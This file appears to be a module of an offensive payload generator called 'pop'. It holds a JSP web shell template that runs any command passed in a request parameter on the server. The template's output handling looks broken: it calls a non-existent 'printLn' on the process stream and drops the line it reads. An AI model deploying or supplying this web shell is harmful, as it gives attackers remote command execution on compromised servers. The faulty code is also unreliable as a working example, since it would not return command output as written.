#
# pop is an offensive payload generator
# Copyright 2021-2022 Philippe Grégoire <git@pgregoire.xyz>
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation; either version 2 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License along
# with this program; if not, write to the Free Software Foundation, Inc.,
# 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.
#

USAGE = ''
NARGS = [0, 0]
LANG = 'jsp'
EXEC = 'PAYLOAD'


pl = '''
<%@ page import="java.io.*,java.util.*"%><% Process VAR0=Runtime.getRuntime().exec(request.getParameter("VAR1"));OutputStream VAR2=VAR0.getOutputStream();DataInputStream VAR3=new DataInputStream(VAR0.getInputStream());String VAR4;while(null!=(VAR4=VAR3.readLine())){VAR2.printLn();} %>
'''
